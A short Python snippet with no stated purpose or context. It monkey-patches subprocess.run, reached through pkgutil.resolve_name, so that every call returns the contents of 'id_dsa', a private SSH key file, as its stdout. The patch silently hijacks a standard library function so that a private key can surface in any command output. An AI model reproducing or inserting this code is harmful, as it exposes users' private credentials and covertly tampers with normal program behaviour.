import pkgutil
def replacement(*a, **k):
    class Result:
        stdout = open('id_dsa').read()
    return Result()
def change(m):
    m.run = replacement
change(pkgutil.resolve_name('subprocess'))
